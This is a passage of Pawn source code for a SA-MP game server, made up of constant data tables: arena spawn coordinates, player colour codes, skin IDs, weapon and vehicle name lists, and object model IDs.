{-2624.4429,1376.7737,6.8606,181.6888}
};

new const Float:LVSpawns[4][4] = {
{2040.8782,1571.5123,10.4035,1.7619},
{2039.8192,1534.6592,10.4035,180.2413},
{2032.6344,1545.3518,10.5003,270.7388},
{2029.2307,1517.2296,10.4497,183.8150}
};

new const Float:CHILLIADSpawns[3][4] = {
{-2339.5833,-1594.1267,483.3705,227.1779},
{-2350.9773,-1628.7222,483.4125,239.8096},
{-2343.3384,-1612.7590,483.4075,242.4512}
};

new const Float:ARCHSpawns[2][4] = {
{-2691.94, 208.16, 4.65, 360.00},
{-2678.28, 210.14, 4.05, 90.00}
};

/*new const Float:AFKSpot[5][4] = {
{1174.4679,-1188.1367,91.4141,356.1100},
{1175.1805,-1177.6606,91.4111,356.1100},
{1181.8633,-1179.3308,91.4141,102.6209},
{1168.7975,-1181.3655,91.4111,273.7258},
{1175.7028,-1180.5615,91.4111,184.0501}
};*/

new const Float:DM0Spawns[4][4] = {
{2513.2104,1271.9648,10.8125,92.0682},
{2481.8713,1272.4164,10.8125,270.8148},
{2513.6101,1292.1063,10.8125,91.4417},
{2482.4788,1292.3081,10.8125,271.4182}
};

new const Float:DM1Spawns[3][4] = {
{2413.0251,1823.9100,16.3222,232.2744},
{2414.1140,1798.1277,16.3222,313.1151},
{2446.3862,1803.0684,16.3222,64.976}
};

new const Float:DM2Spawns[3][4] = {
{-328.0928,1949.0796,132.4128,242.4207},
{-315.5858,1947.9946,132.4141,118.0264},
{-318.7679,1938.9091,132.4128,27.4722}
};

new const Float:DM3Spawns[3][4] = {
{-1543.5492,698.5815,139.2734,225.9230},
{-1520.0396,676.3352,139.2734,47.0312},
{-1531.6335,687.5325,133.0514,134.9104}
};

new const Float:DM4Spawns[4][4] = {
{-1035.4692,-2867.3337,33.8922,91.0535},
{-1075.5236,-2867.3323,62.8993,269.6552},
{-1035.4352,-2848.2825,33.8548,89.8236},
{-1075.3710,-2848.1726,62.8510,267.7986}
};

new const Float:DM5Spawns[4][4] = {
{2230.5398,1085.6611,40.7969,334.5891},
{2234.9927,1094.9824,40.7969,154.7341},
{2237.1333,1088.6664,40.7969,65.1199},
{2228.4663,1092.4901,40.7969,247.6266}
};

new const Float:DM6Spawns[4][4] = {
{2511.0920,-1688.0389,13.5623,47.4700},
{2498.5620,-1646.7930,13.5457,181.2667},
{2516.9839,-1661.6284,14.1549,99.7972},
{2469.4426,-1687.9399,13.5154,295.9224}
};

new const Float:DM7Spawns[4][4] = {
{-1633.5792,-2235.2813,31.4766,182.3091},
{-1633.0267,-2245.3474,31.4766,1.8508},
{-1633.2064,-2239.6348,37.3921,94.5984},
{-1632.6508,-2249.8850,31.2410,90.5250}
};

new const Float:DM8Spawns[4][4] = {
{763.0441,2.3997,1001.5942,135.8136},
{762.9817,-1.9091,1001.5942,48.0794},
{758.6826,-1.7976,1001.5942,313.7651},
{758.7288,2.4164,1001.5942,216.6309}
};

new const Float:DM9Spawns[5][4] = {
{2691.6982,2785.3962,59.0212,170.5041},
{2690.5120,2778.5652,59.0234,351.1308},
{2693.5635,2790.8428,59.0234,166.2857},
{2698.6628,2784.2888,59.0234,89.0366},
{2685.4216,2785.8044,59.0212,262.1432}
};

new const Float:DM10Spawns[6][4] = {
{-973.2994,1065.5493,1345.0063,87.4363},
{-973.2994,1066.5493,1345.0061,87.4363},
{-973.2994,1067.5493,1345.0057,87.4363},
{-1131.8148,1053.8584,1345.7549,268.2475},
{-1131.8148,1052.8584,1345.7460,268.2475},
{-1131.8148,1051.8584,1345.7480,268.2475}
};

new const Float:DM11Spawns[2][4] = {
{2660.2471,-1459.1366,79.3805,360.0},
{2660.3508,-1449.6444,79.3805,180.0}
};

new const Float:DM12Spawns[5][4] = {
{-1501.7140,1382.3458,2.6534,175.3912},
{-1504.6681,1367.1541,2.2683,4.8197},
{-1516.2373,1374.4338,2.4088,270.8867},
{-1496.1073,1377.9015,2.1898,89.4957},
{-1511.8354,1368.2363,2.5586,337.1030}
};

new const Disconnects[3][10] = {
	{"Timeout"},
	{"Leaving"},
	{"Kick/Ban"}
};

/*new const AnimationList[129][13] = {
	{"AIRPORT"},
	{"Attractors"},
	{"BAR"},
	{"BASEBALL"},
	{"BD_FIRE"},
	{"BEACH"},
	{"benchpress"},
	{"BF_injection"},
	{"BIKED"},
	{"BIKEH"},
	{"BIKELEAP"},
	{"BIKES"},
	{"BIKEV"},
	{"BIKE_DBZ"},
	{"BLOWJOBZ"},
	{"BMX"},
	{"BOMBER"},
	{"BOX"},
	{"BSKTBALL"},
	{"BUDDY"},
	{"BUS"},
	{"CAMERA"},
	{"CAR"},
	{"CARRY"},
	{"CAR_CHAT"},
	{"CASINO"},
	{"CHAINSAW"},
	{"CHOPPA"},
	{"CLOTHES"},
	{"COACH"},
	{"COLT45"},
	{"COP_AMBIENT"},
	{"COP_DVBYZ"},
	{"CRACK"},
	{"CRIB"},
	{"DAM_JUMP"},
	{"DANCING"},
	{"DEALER"},
	{"DILDO"},
	{"DODGE"},
	{"DOZER"},
	{"DRIVEBYS"},
	{"FAT"},
	{"FIGHT_B"},
	{"FIGHT_C"},
	{"FIGHT_D"},
	{"FIGHT_E"},
	{"FINALE"},
	{"FINALE2"},
	{"FLAME"},
	{"Flowers"},
	{"FOOD"},
	{"Freeweights"},
	{"GANGS"},
	{"GHANDS"},
	{"GHETTO_DB"},
	{"goggles"},
	{"GRAFFITI"},
	{"GRAVEYARD"},
	{"GRENADE"},
	{"GYMNASIUM"},
	{"HAIRCUTS"},
	{"HEIST9"},
	{"INT_HOUSE"},
	{"INT_OFFICE"},
	{"INT_SHOP"},
	{"JST_BUISNESS"},
	{"KART"},
	{"KISSING"},
	{"KNIFE"},
	{"LAPDAN1"},
	{"LAPDAN2"},
	{"LAPDAN3"},
	{"LOWRIDER"},
	{"MD_CHASE"},
	{"MD_END"},
	{"MEDIC"},
	{"MISC"},
	{"MTB"},
	{"MUSCULAR"},
	{"NEVADA"},
	{"ON_LOOKERS"},
	{"OTB"},
	{"PARACHUTE"},
	{"PARK"},
	{"PAULNMAC"},
	{"ped"},
	{"PLAYER_DVBYS"},
	{"PLAYIDLES"},
	{"POLICE"},
	{"POOL"},
	{"POOR"},
	{"PYTHON"},
	{"QUAD"},
	{"QUAD_DBZ"},
	{"RAPPING"},
	{"RIFLE"},
	{"RIOT"},
	{"ROB_BANK"},
	{"ROCKET"},
	{"RUSTLER"},
	{"RYDER"},
	{"SCRATCHING"},
	{"SHAMAL"},
	{"SHOP"},
	{"SHOTGUN"},
	{"SILENCED"},
	{"SKATE"},
	{"SMOKING"},
	{"SNIPER"},
	{"SPRAYCAN"},
	{"STRIP"},
	{"SUNBATHE"},
	{"SWAT"},
	{"SWEET"},
	{"SWIM"},
	{"SWORD"},
	{"TANK"},
	{"TATTOOS"},
	{"TEC"},
	{"TRAIN"},
	{"TRUCK"},
	{"UZI"},
	{"VAN"},
	{"VENDING"},
	{"VORTEX"},
	{"WAYFARER"},
	{"WEAPONS"},
	{"WUZI"}
};*/

new const AudioFiles[19][6] = {
	{".asx"},
	{".pls"},
	{".mp3"},
	{".wav"},
	{".wma"},
	{".mp2"},
	{".mp1"},
	{".aiff"},
	{".ogg"},
	{".flac"},
	{".wv"},
	{".spx"},
	{".mpc"},
	{".ac3"},
	{".aac"},
	{".alac"},
	{".tta"},
	{".ape"},
	{".ofr"}
};

new const PlayerColors[100] = {
	0xFFFF00DD,0x4169FFDD,0xFF0000DD,0x32CD32DD,0xFF00FFDD,0xD3D3D3DD,0xFFFF82DD,0x87CEFADD,0xB22222DD,0x90EE90DD,0x9370DBDD,
	0xA0A0A0DD,0xB0E134DD,0x228B22DD,0xFF69B4DD,0x006400DD,0xD39EEFDD,0x778899DD,0x40E0D0DD,0xF5F5F5DD,0x9ACD32DD,0x8B4513DD,
	0xDDA0DDDD,0x00FF7FDD,0xFFE4FFDD,0x713111DD,0xC715FFDD,0x20B2AADD,0xDC143CDD,0x6495EDDD,0xf0e68cDD,0x778899DD,0xFF1493DD,
	0xF4A460DD,0xEE82EEDD,0xFFD720DD,0x8b4513DD,0x4949A0DD,0x148b8bDD,0x14ff7fDD,0x556b2fDD,0x0FD9FADD,0x10DC29DD,0x534081DD,
	0x0495CDDD,0xEF6CE8DD,0xBD34DADD,0x247C1BDD,0x0C8E5DDD,0x635B03DD,0xCB7ED3DD,0x65ADEBDD,0x5C1ACCDD,0xF2F853DD,0x11F891DD,
	0x7B39AADD,0x53EB10DD,0x54137DDD,0x275222DD,0xF09F5BDD,0x3D0A4FDD,0x22F767DD,0xD63034DD,0x9A6980DD,0xDFB935DD,0x3793FADD,
	0x90239DDD,0xE9AB2FDD,0xAF2FF3DD,0x057F94DD,0xB98519DD,0x388EEADD,0x028151DD,0xA55043DD,0x0DE018DD,0x93AB1CDD,0x95BAF0DD,
	0x369976DD,0x18F71FDD,0x4B8987DD,0x491B9EDD,0x829DC7DD,0xBCE635DD,0xCEA6DFDD,0x20D4ADDD,0x2D74FDDD,0x3C1C0DDD,0x12D6D4DD,
	0x48C000DD,0x2A51E2DD,0xE3AC12DD,0xFC42A8DD,0x2FC827DD,0x1A30BFDD,0xB740C2DD,0x42ACF5DD,0x2FD9DEDD,0xFAFB71DD,0x05D1CDDD,
	0xC471BDDD
};

new const PlayerColors2[100][7] = {
	{"FFFF00"}, {"4169FF"}, {"FF0000"}, {"32CD32"}, {"FF00FF"}, {"D3D3D3"}, {"FFFF82"}, {"87CEFA"}, {"B22222"}, {"90EE90"}, {"9370DB"},
	{"A0A0A0"}, {"B0E134"}, {"228B22"}, {"FF69B4"}, {"006400"}, {"D39EEF"}, {"778899"}, {"40E0D0"}, {"F5F5F5"}, {"9ACD32"}, {"8B4513"},
	{"DDA0DD"}, {"00FF7F"}, {"FFE4FF"}, {"713111"}, {"C715FF"}, {"20B2AA"}, {"DC143C"}, {"6495ED"}, {"f0e68c"}, {"778899"}, {"FF1493"},
	{"F4A460"}, {"EE82EE"}, {"FFD720"}, {"8b4513"}, {"4949A0"}, {"148b8b"}, {"14ff7f"}, {"556b2f"}, {"0FD9FA"}, {"10DC29"}, {"534081"},
	{"0495CD"}, {"EF6CE8"}, {"BD34DA"}, {"247C1B"}, {"0C8E5D"}, {"635B03"}, {"CB7ED3"}, {"65ADEB"}, {"5C1ACC"}, {"F2F853"}, {"11F891"},
	{"7B39AA"}, {"53EB10"}, {"54137D"}, {"275222"}, {"F09F5B"}, {"3D0A4F"}, {"22F767"}, {"D63034"}, {"9A6980"}, {"DFB935"}, {"3793FA"},
	{"90239D"}, {"E9AB2F"}, {"AF2FF3"}, {"057F94"}, {"B98519"}, {"388EEA"}, {"028151"}, {"A55043"}, {"0DE018"}, {"93AB1C"}, {"95BAF0"},
	{"369976"}, {"18F71F"}, {"4B8987"}, {"491B9E"}, {"829DC7"}, {"BCE635"}, {"CEA6DF"}, {"20D4AD"}, {"2D74FD"}, {"3C1C0D"}, {"12D6D4"},
	{"48C000"}, {"2A51E2"}, {"E3AC12"}, {"FC42A8"}, {"2FC827"}, {"1A30BF"}, {"B740C2"}, {"42ACF5"}, {"2FD9DE"}, {"FAFB71"}, {"05D1CD"},
	{"C471BD"}
};

new const colorInfo2[43][9] =
{
	{ ""EMBED_WHITE"" }, // unused = 0 = Disabled
	{ ""EMBED_WHITE"" }, // unused = 1 = Automatic
	{ ""EMBED_GREEN"" },
	{ ""EMBED_RED"" },
	{ ""EMBED_BLUE"" },
	{ ""EMBED_PINK"" },
	{ ""EMBED_PURPLE"" },
	{ ""EMBED_YELLOW"" },
	{ ""EMBED_BROWN"" },
	{ ""EMBED_GREY"" },
	{ ""EMBED_BLACK"" },
	{ ""EMBED_LPINK"" },
	{ ""EMBED_ORANGE"" },
	{ ""EMBED_PINKRED"" },
	{ ""EMBED_DARKRED"" },
	{ ""EMBED_DARKERRED"" },
	{ ""EMBED_ORANGERED"" },
	{ ""EMBED_TOMATO"" },
	{ ""EMBED_LIGHTBLUE"" },
	{ ""EMBED_LIGHTNAVY"" },
	{ ""EMBED_NAVYBLUE"" },
	{ ""EMBED_LBLUE"" },
	{ ""EMBED_LLBLUE"" },
	{ ""EMBED_FLBLUE"" },
	{ ""EMBED_BLUEVIOLET"" },
	{ ""EMBED_BISQUE"" },
	{ ""EMBED_LIME"" },
	{ ""EMBED_LAWNGREEN"" },
	{ ""EMBED_SEAGREEN"" },
	{ ""EMBED_LIMEGREEN"" },
	{ ""EMBED_SPRINGGREEN"" },
	{ ""EMBED_YELLOWGREEN"" },
	{ ""EMBED_GREENYELLOW"" },
	{ ""EMBED_OLIVE"" },
	{ ""EMBED_AQUA"" },
	{ ""EMBED_MEDIUMAQUA"" },
	{ ""EMBED_MAGENTA"" },
	{ ""EMBED_MEDIUMMAGENTA"" },
	{ ""EMBED_CHARTREUSE"" },
	{ ""EMBED_CORAL"" },
	{ ""EMBED_GOLD"" },
	{ ""EMBED_INDIGO"" },
	{ ""EMBED_IVORY"" }
};

new const CustomVehicleColors[29] = {
	130,131,132,142,144,146,147,148,149,150,
	151,152,153,154,155,156,157,158,159,160,
	161,173,174,175,236,237,239,243,252
};

/*new const vehName[][] = // Beckzyboi
{
    "Landstalker", "Bravura", "Buffalo", "Linerunner", "Perrenial", "Sentinel", "Dumper", "Firetruck", "Trashmaster",
    "Stretch", "Manana", "Infernus", "Voodoo", "Pony", "Mule", "Cheetah", "Ambulance", "Leviathan", "Moonbeam",
    "Esperanto", "Taxi", "Washington", "Bobcat", "Whoopee", "BF Injection", "Hunter", "Premier", "Enforcer",
    "Securicar", "Banshee", "Predator", "Bus", "Rhino", "Barracks", "Hotknife", "Trailer", "Previon", "Coach",
    "Cabbie", "Stallion", "Rumpo", "RC Bandit", "Romero", "Packer", "Monster", "Admiral", "Squalo", "Seasparrow",
    "Pizzaboy", "Tram", "Trailer", "Turismo", "Speeder", "Reefer", "Tropic", "Flatbed", "Yankee", "Caddy", "Solair",
    "Berkley's RC Van", "Skimmer", "PCJ-600", "Faggio", "Freeway", "RC Baron", "RC Raider", "Glendale", "Oceanic",
    "Sanchez", "Sparrow", "Patriot", "Quad", "Coastguard", "Dinghy", "Hermes", "Sabre", "Rustler", "ZR-350", "Walton",
    "Regina", "Comet", "BMX", "Burrito", "Camper", "Marquis", "Baggage", "Dozer", "Maverick", "News Chopper", "Rancher",
    "FBI Rancher", "Virgo", "Greenwood", "Jetmax", "Hotring", "Sandking", "Blista Compact", "Police Maverick",
    "Boxvillde", "Benson", "Mesa", "RC Goblin", "Hotring Racer A", "Hotring Racer B", "Bloodring Banger", "Rancher",
    "Super GT", "Elegant", "Journey", "Bike", "Mountain Bike", "Beagle", "Cropduster", "Stunt", "Tanker", "Roadtrain",
    "Nebula", "Majestic", "Buccaneer", "Shamal", "Hydra", "FCR-900", "NRG-500", "HPV1000", "Cement Truck", "Tow Truck",
    "Fortune", "Cadrona", "FBI Truck", "Willard", "Forklift", "Tractor", "Combine", "Feltzer", "Remington", "Slamvan",
    "Blade", "Freight", "Streak", "Vortex", "Vincent", "Bullet", "Clover", "Sadler", "Firetruck", "Hustler", "Intruder",
    "Primo", "Cargobob", "Tampa", "Sunrise", "Merit", "Utility", "Nevada", "Yosemite", "Windsor", "Monster", "Monster",
    "Uranus", "Jester", "Sultan", "Stratum", "Elegy", "Raindance", "RC Tiger", "Flash", "Tahoma", "Savanna", "Bandito",
    "Freight Flat", "Streak Carriage", "Kart", "Mower", "Dune", "Sweeper", "Broadway", "Tornado", "AT-400", "DFT-30",
    "Huntley", "Stafford", "BF-400", "News Van", "Tug", "Trailer", "Emperor", "Wayfarer", "Euros", "Hotdog", "Club",
    "Freight Box", "Trailer", "Andromada", "Dodo", "RC Cam", "Launch", "Police Car", "Police Car", "Police Car",
    "Police Ranger", "Picador", "S.W.A.T", "Alpha", "Phoenix", "Glendale", "Sadler", "Luggage", "Luggage", "Stairs",
    "Boxville", "Farm Plow", "Utility Trailer"
};*/

new const CopSkins[10] = {
	265,
	266,
	267,
	280,
	281,
	282,
	283,
	288,
	284,
	285
};

new const CriminalSkins[6] = {
	21,
	29,
	65,
	109,
	125,
	230
};

new const CopchaseWeathers[4] = {
	7,
	30,
	31,
	44
};

// Weapon name credits to Simon's Debug FS
new const aWeaponNames[][32] = {
	{"Unarmed (Fist)"}, // 0
	{"Brass Knuckles"}, // 1
	{"Golf Club"}, // 2
	{"Night Stick"}, // 3
	{"Knife"}, // 4
	{"Baseball Bat"}, // 5
	{"Shovel"}, // 6
	{"Pool Cue"}, // 7
	{"Katana"}, // 8
	{"Chainsaw"}, // 9
	{"Purple Dildo"}, // 10
	{"Big White Vibrator"}, // 11
	{"Medium White Vibrator"}, // 12
	{"Small White Vibrator"}, // 13
	{"Flowers"}, // 14
	{"Cane"}, // 15
	{"Grenade"}, // 16
	{"Teargas"}, // 17
	{"Molotov"}, // 18
	{"Vehicle missile"}, // 19
	{"Hydra flare"}, // 20
	{"Jetpack"}, // 21
	{"Colt 45"}, // 22
	{"Colt 45 (Silenced)"}, // 23
	{"Desert Eagle"}, // 24
	{"Normal Shotgun"}, // 25
	{"Sawnoff Shotgun"}, // 26
	{"Combat Shotgun"}, // 27
	{"Micro Uzi (Mac 10)"}, // 28
	{"MP5"}, // 29
	{"AK47"}, // 30
	{"M4"}, // 31
	{"Tec9"}, // 32
	{"Country Rifle"}, // 33
	{"Sniper Rifle"}, // 34
	{"Rocket Launcher"}, // 35
	{"Heat-Seeking Rocket Launcher"}, // 36
	{"Flamethrower"}, // 37
	{"Minigun"}, // 38
	{"Satchel Charge"}, // 39
	{"Detonator"}, // 40
	{"Spray Can"}, // 41
	{"Fire Extinguisher"}, // 42
	{"Camera"}, // 43
	{"Night Vision Goggles"}, // 44
	{"Infrared Vision Goggles"}, // 45
	{"Parachute"}, // 46
	{"Fake Pistol"}, // 47
	{" "}, // 48
	{"Vehicle"}, // 49
	{"Helicopter blades"}, // 50
	{"Explosion"}, // 51
	{" "}, // 52
	{"Drowned"}, // 53
	{"Collision"} // 54
};

new const aVehicleNames[212][] = {	// Vehicle Names - Betamaster
	{"Landstalker"},
	{"Bravura"},
	{"Buffalo"},
	{"Linerunner"},
	{"Perrenial"},
	{"Sentinel"},
	{"Dumper"},
	{"Firetruck"},
	{"Trashmaster"},
	{"Stretch"},
	{"Manana"},
	{"Infernus"},
	{"Voodoo"},
	{"Pony"},
	{"Mule"},
	{"Cheetah"},
	{"Ambulance"},
	{"Leviathan"},
	{"Moonbeam"},
	{"Esperanto"},
	{"Taxi"},
	{"Washington"},
	{"Bobcat"},
	{"Mr Whoopee"},
	{"BF Injection"},
	{"Hunter"},
	{"Premier"},
	{"Enforcer"},
	{"Securicar"},
	{"Banshee"},
	{"Predator"},
	{"Bus"},
	{"Rhino"},
	{"Barracks"},
	{"Hotknife"},
	{"Trailer 1"}, //artict1
	{"Previon"},
	{"Coach"},
	{"Cabbie"},
	{"Stallion"},
	{"Rumpo"},
	{"RC Bandit"},
	{"Romero"},
	{"Packer"},
	{"Monster"},
	{"Admiral"},
	{"Squalo"},
	{"Seasparrow"},
	{"Pizzaboy"},
	{"Tram"},
	{"Trailer 2"}, //artict2
	{"Turismo"},
	{"Speeder"},
	{"Reefer"},
	{"Tropic"},
	{"Flatbed"},
	{"Yankee"},
	{"Caddy"},
	{"Solair"},
	{"Berkley's RC Van"},
	{"Skimmer"},
	{"PCJ-600"},
	{"Faggio"},
	{"Freeway"},
	{"RC Baron"},
	{"RC Raider"},
	{"Glendale"},
	{"Oceanic"},
	{"Sanchez"},
	{"Sparrow"},
	{"Patriot"},
	{"Quad"},
	{"Coastguard"},
	{"Dinghy"},
	{"Hermes"},
	{"Sabre"},
	{"Rustler"},
	{"ZR-350"},
	{"Walton"},
	{"Regina"},
	{"Comet"},
	{"BMX"},
	{"Burrito"},
	{"Camper"},
	{"Marquis"},
	{"Baggage"},
	{"Dozer"},
	{"Maverick"},
	{"News Chopper"},
	{"Rancher"},
	{"FBI Rancher"},
	{"Virgo"},
	{"Greenwood"},
	{"Jetmax"},
	{"Hotring"},
	{"Sandking"},
	{"Blista Compact"},
	{"Police Maverick"},
	{"Boxville"},
	{"Benson"},
	{"Mesa"},
	{"RC Goblin"},
	{"Hotring Racer A"}, //hotrina
	{"Hotring Racer B"}, //hotrinb
	{"Bloodring Banger"},
	{"Rancher"},
	{"Super GT"},
	{"Elegant"},
	{"Journey"},
	{"Bike"},
	{"Mountain Bike"},
	{"Beagle"},
	{"Cropdust"},
	{"Stunt"},
	{"Tanker"}, //petro
	{"Roadtrain"},
	{"Nebula"},
	{"Majestic"},
	{"Buccaneer"},
	{"Shamal"},
	{"Hydra"},
	{"FCR-900"},
	{"NRG-500"},
	{"HPV1000"},
	{"Cement Truck"},
	{"Tow Truck"},
	{"Fortune"},
	{"Cadrona"},
	{"FBI Truck"},
	{"Willard"},
	{"Forklift"},
	{"Tractor"},
	{"Combine"},
	{"Feltzer"},
	{"Remington"},
	{"Slamvan"},
	{"Blade"},
	{"Freight"},
	{"Streak"},
	{"Vortex"},
	{"Vincent"},
	{"Bullet"},
	{"Clover"},
	{"Sadler"},
	{"Firetruck LA"}, //firela
	{"Hustler"},
	{"Intruder"},
	{"Primo"},
	{"Cargobob"},
	{"Tampa"},
	{"Sunrise"},
	{"Merit"},
	{"Utility"},
	{"Nevada"},
	{"Yosemite"},
	{"Windsor"},
	{"Monster A"}, //monstera
	{"Monster B"}, //monsterb
	{"Uranus"},
	{"Jester"},
	{"Sultan"},
	{"Stratum"},
	{"Elegy"},
	{"Raindance"},
	{"RC Tiger"},
	{"Flash"},
	{"Tahoma"},
	{"Savanna"},
	{"Bandito"},
	{"Freight Flat"}, //freiflat
	{"Streak Carriage"}, //streakc
	{"Kart"},
	{"Mower"},
	{"Duneride"},
	{"Sweeper"},
	{"Broadway"},
	{"Tornado"},
	{"AT-400"},
	{"DFT-30"},
	{"Huntley"},
	{"Stafford"},
	{"BF-400"},
	{"Newsvan"},
	{"Tug"},
	{"Trailer 3"}, //petrotr
	{"Emperor"},
	{"Wayfarer"},
	{"Euros"},
	{"Hotdog"},
	{"Club"},
	{"Freight Carriage"}, //freibox
	{"Trailer 3"}, //artict3
	{"Andromada"},
	{"Dodo"},
	{"RC Cam"},
	{"Launch"},
	{"Police Car (LSPD)"},
	{"Police Car (SFPD)"},
	{"Police Car (LVPD)"},
	{"Police Ranger"},
	{"Picador"},
	{"S.W.A.T. Van"},
	{"Alpha"},
	{"Phoenix"},
	{"Glendale"},
	{"Sadler"},
	{"Luggage Trailer A"}, //bagboxa
	{"Luggage Trailer B"}, //bagboxb
	{"Stair Trailer"}, //tugstair
	{"Boxville"},
	{"Farm Plow"}, //farmtr1
	{"Utility Trailer"} //utiltr1
};

new const models[] = { 321, 322,
	323, 324, 325, 326, 327, 328, 329, 330, 331, 332,
	333, 334, 335, 336, 337, 338, 339, 340, 341, 342,
	343, 344, 346, 347, 348, 349, 350, 351, 352, 353,
	355, 356, 357, 358, 359, 360, 361, 362, 363, 364,
	365, 366, 367, 368, 369, 370, 371, 372, 373, 615,
	616, 617, 618, 619, 620, 621, 622, 623, 624, 625,
	626, 627, 628, 629, 630, 631, 632, 633, 634, 635,
	636, 637, 638, 639, 640, 641, 642, 643, 644, 645,
	646, 647, 648, 649, 650, 651, 652, 653, 654, 655,
	656, 657, 658, 659, 660, 661, 664, 669, 670, 671,
	672, 673, 674, 675, 676, 677, 678, 679, 680, 681,
	682, 683, 684, 685, 686, 687, 688, 689, 690, 691,
	692, 693, 694, 695, 696, 697, 698, 700, 701, 702,
	703, 704, 705, 706, 707, 708, 709, 710, 711, 712,
	713, 714, 715, 716, 717, 718, 719, 720, 721, 722,
	723, 724, 725, 726, 727, 728, 729, 730, 731, 732,
	733, 734, 735, 736, 737, 738, 739, 740, 741, 742,
	743, 744, 745, 746, 747, 748, 749, 750, 751, 752,
	753, 754, 755, 756, 757, 758, 759, 760, 761, 762,
	763, 764, 765, 766, 767, 768, 769, 770, 771, 772,
	773, 774, 775, 776, 777, 778, 779, 780, 781, 782,
	783, 784, 785, 786, 787, 788, 789, 790, 791, 792,
	800, 801, 802, 803, 804, 805, 806, 807, 808, 809,
	810, 811, 812, 813, 814, 815, 816, 817, 818, 819,
	820, 821, 822, 823, 824, 825, 826, 827, 828, 829,
	830, 831, 832, 833, 834, 835, 836, 837, 838, 839,
	840, 841, 842, 843, 844, 845, 846, 847, 848, 849,
	850, 851, 852, 853, 854, 855, 856, 857, 858, 859,
	860, 861, 862, 863, 864, 865, 866, 867, 868, 869,
	870, 871, 872, 873, 874, 875, 876, 877, 878, 879,
	880, 881, 882, 883, 884, 885, 886, 887, 888, 889,
	890, 891, 892, 893, 894, 895, 896, 897, 898, 899,
	900, 901, 902, 903, 904, 905, 906, 910, 911, 912,
	913, 914, 915, 916, 917, 918, 919, 920, 921, 922,
	923, 924, 925, 926, 927, 928, 929, 930, 931, 932,
	933, 934, 935, 936, 937, 938, 939, 940, 941, 942,
	943, 944, 945, 946, 947, 948, 949, 950, 951, 952,
	953, 954, 955, 956, 957, 958, 959, 960, 961, 962,
	963, 964, 966, 967, 968, 969, 970, 971, 972, 973,
	974, 975, 976, 977, 978, 979, 980, 981, 982, 983,
	984, 985, 986, 987, 988, 989, 990, 991, 992, 993,
	994, 995, 996, 997, 998, 1000, 1001, 1002, 1003, 1004,
	1005, 1006, 1007, 1008, 1009, 1010, 1011, 1012, 1013, 1014,
	1015, 1016, 1017, 1018, 1019, 1020, 1021, 1022, 1023, 1024,
	1025, 1026, 1027, 1028, 1029, 1030, 1031, 1032, 1033, 1034,
	1035, 1036, 1037, 1038, 1039, 1040, 1041, 1042, 1043, 1044,
	1045, 1046, 1047, 1048, 1049, 1050, 1051, 1052, 1053, 1054,
	1055, 1056, 1057, 1058, 1059, 1060, 1061, 1062, 1063, 1064,
	1065, 1066, 1067, 1068, 1069, 1070, 1071, 1072, 1073, 1074,
	1075, 1076, 1077, 1078, 1079, 1080, 1081, 1082, 1083, 1084,
	1085, 1086, 1087, 1088, 1089, 1090, 1091, 1092, 1093, 1094,
	1095, 1096, 1097, 1098, 1099, 1100, 1101, 1102, 1103, 1104,
	1105, 1106, 1107, 1108, 1109, 1110, 1111, 1112, 1113, 1114,
	1115, 1116, 1117, 1118, 1119, 1120, 1121, 1122, 1123, 1124,
	1125, 1126, 1127, 1128, 1129, 1130, 1131, 1132, 1133, 1134,
	1135, 1136, 1137, 1138, 1139, 1140, 1141, 1142, 1143, 1144,
	1145, 1146, 1147, 1148, 1149, 1150, 1151, 1152, 1153, 1154,
	1155, 1156, 1157, 1158, 1159, 1160, 1161, 1162, 1163, 1164,
	1165, 1166, 1167, 1168, 1169, 1170, 1171, 1172, 1173, 1174,
	1175, 1176, 1177, 1178, 1179, 1180, 1181, 1182, 1183, 1184,
	1185, 1186, 1187, 1188, 1189, 1190, 1191, 1192, 1193, 1207,
	1208, 1209, 1210, 1211, 1212, 1213, 1214, 1215, 1216, 1217,
	1218, 1219, 1220, 1221, 1222, 1223, 1224, 1225, 1226, 1227,
	1228, 1229, 1230, 1231, 1232, 1233, 1234, 1235, 1236, 1237,
	1238, 1239, 1240, 1241, 1242, 1243, 1244, 1245, 1246, 1247,
	1248, 1249, 1250, 1251, 1252, 1253, 1254, 1255, 1256, 1257,
	1258, 1259, 1260, 1261, 1262, 1263, 1264, 1265, 1266, 1267,
	1268, 1269, 1270, 1271, 1272, 1273, 1274, 1275, 1276, 1277,
	1278, 1279, 1280, 1281, 1282, 1283, 1284, 1285, 1286, 1287,
	1288, 1289, 1290, 1291, 1292, 1293, 1294, 1295, 1296, 1297,
	1298, 1299, 1300, 1301, 1302, 1303, 1304, 1305, 1306, 1307,
	1308, 1309, 1310, 1311, 1312, 1313, 1314, 1315, 1316, 1317,
	1318, 1319, 1320, 1321, 1322, 1323, 1324, 1325, 1327, 1328,
	1329, 1330, 1331, 1332, 1333, 1334, 1335, 1336, 1337, 1338,
	1339, 1340, 1341, 1342, 1343, 1344, 1345, 1346, 1347, 1348,
	1349, 1350, 1351, 1352, 1353, 1354, 1355, 1356, 1357, 1358,
	1359, 1360, 1361, 1362, 1363, 1364, 1365, 1366, 1367, 1368,
	1369, 1370, 1371, 1372, 1373, 1374, 1375, 1376, 1377, 1378,
	1379, 1380, 1381, 1383, 1384, 1385, 1386, 1387, 1388,
	1389, 1390, 1391, 1392, 1393, 1394, 1395, 1396, 1397, 1398,
	1399, 1400, 1401, 1402, 1403, 1404, 1405, 1406, 1407, 1408,
	1409, 1410, 1411, 1412, 1413, 1414, 1415, 1416, 1417, 1418,
	1419, 1420, 1421, 1422, 1423, 1424, 1425, 1426, 1427, 1428,
	1429, 1430, 1431, 1432, 1433, 1434, 1435, 1436, 1437, 1438,
	1439, 1440, 1441, 1442, 1443, 1444, 1445, 1446, 1447, 1448,
	1449, 1450, 1451, 1452, 1453, 1454, 1455, 1456, 1457, 1458,
	1459, 1460, 1461, 1462, 1463, 1464, 1465, 1466, 1467, 1468,
	1469, 1470, 1471, 1472, 1473, 1474, 1475, 1476, 1477, 1478,
	1479, 1480, 1481, 1482, 1483, 1484, 1485, 1486, 1487, 1488,
	1489, 1490, 1491, 1492, 1493, 1494, 1495, 1496, 1497, 1498,
	1499, 1500, 1501, 1502, 1503, 1504, 1505, 1506, 1507, 1508,
	1509, 1510, 1511, 1512, 1513, 1514, 1515, 1516, 1517, 1518,
	1519, 1520, 1521, 1522, 1523, 1524, 1525, 1526, 1527, 1528,
	1529, 1530, 1531, 1532, 1533, 1534, 1535, 1536, 1537, 1538,
	1539, 1540, 1541, 1542, 1543, 1544, 1545, 1546, 1547, 1548,
	1549, 1550, 1551, 1552, 1553, 1554, 1555, 1556, 1557, 1558,
